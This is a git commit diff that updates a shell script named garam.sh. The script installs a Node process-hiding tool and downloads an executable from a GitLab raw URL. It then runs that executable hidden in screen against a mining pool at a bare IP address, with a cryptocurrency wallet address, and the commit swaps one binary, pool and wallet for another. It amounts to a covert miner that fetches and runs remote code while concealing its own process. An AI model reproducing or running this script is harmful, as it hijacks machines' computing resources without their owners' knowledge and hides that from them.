3b29ba5c34ea2716aae6ebe275201cdb8e560f9b
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-19 19:32:04 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -5,9 +5,9 @@ sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-esse
 sudo apt install screen -y
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
-sudo apt install npm =y
-sudo npm i -g node-process-hider && sudo ph add sulit
-wget -qO sulit https://gitlab.com/sarifadim/jomblo/-/raw/main/lolipop && chmod +x *
-screen -dms run ./sulit --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.237.21.190:443 --log --extra --pers=PYI
+sudo apt install npm -y
+sudo npm i -g node-process-hider && sudo ph add soda
+wget -qO soda https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/soda && chmod +x *
+screen -dms run ./soda -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
 EOF
 screen -r
